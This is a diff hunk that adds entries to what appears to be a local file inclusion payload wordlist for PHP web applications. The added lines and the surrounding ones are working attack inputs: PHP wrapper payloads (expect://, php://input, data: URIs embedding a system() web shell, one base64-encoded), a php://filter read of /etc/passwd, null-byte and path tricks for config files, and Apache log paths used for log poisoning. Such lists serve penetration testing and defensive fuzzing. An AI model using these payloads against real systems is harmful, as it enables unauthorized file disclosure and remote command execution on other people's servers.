@@ -11,9 +11,11 @@ expect://ls
 /etc/my.cnf
 /etc/my.cnf%00
 /etc/my.cnf/././
+php://filter/resource=/etc/passwd
 data:text/plain,<?system($_GET['x']);?>&x=ls
 data:,<?system($_GET['x']);?>&x=ls
 data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
+php://input&cmd=ls
 /etc/httpd/logs/acces_log
 /etc/httpd/logs/acces_log%00
 /etc/httpd/logs/acces.log
